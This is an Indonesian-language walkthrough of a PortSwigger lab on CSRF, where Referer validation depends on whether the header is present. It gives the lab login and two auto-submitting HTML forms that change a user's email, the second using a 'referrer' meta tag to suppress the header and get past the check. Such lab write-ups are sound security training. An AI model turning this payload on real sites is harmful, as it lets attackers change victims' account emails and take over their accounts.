# CSRF di mana Validasi Referer Bergantung pada Keberadaan Header

Fungsi perubahan email pada lab ini rentan terhadap CSRF. Sistem mencoba memblokir permintaan lintas domain tetapi memiliki fallback yang tidak aman.

Untuk menyelesaikan lab ini, gunakan server exploit Anda untuk meng-host halaman HTML yang menggunakan serangan CSRF untuk mengubah alamat email pengguna yang melihat halaman tersebut.

Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut: **wiener:peter**

**Hint:** Anda tidak dapat mendaftarkan alamat email yang sudah digunakan oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji exploit Anda, pastikan Anda menggunakan alamat email yang berbeda untuk exploit akhir yang akan Anda kirimkan kepada korban.

---------------------------------------------

**Referensi:**

- [Bypassing Referer-based Defenses pada CSRF](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)

![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/1.png)

---------------------------------------------

Ada fungsi untuk memperbarui email:

![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/2.png)

Ini adalah permintaan POST dengan header HTTP “Referer”:

![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/3.png)

Pertama, kita menghasilkan PoC CSRF:

```html
<html>
  <!-- CSRF PoC - dihasilkan oleh Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Kirim permintaan" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Ketika dibuka, halaman ini mengembalikan error berikut:

![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/4.png)

Menambahkan baris untuk menghindari penggunaan header Referer menyelesaikan masalah ini:

```html
<meta name="referrer" content="never">
```

```html
<html>
  <!-- CSRF PoC - dihasilkan oleh Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <meta name="referrer" content="never">
      <input type="hidden" name="email" value="test777&#64;test&#46;com" />
      <input type="submit" value="Kirim permintaan" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/5.png)

---

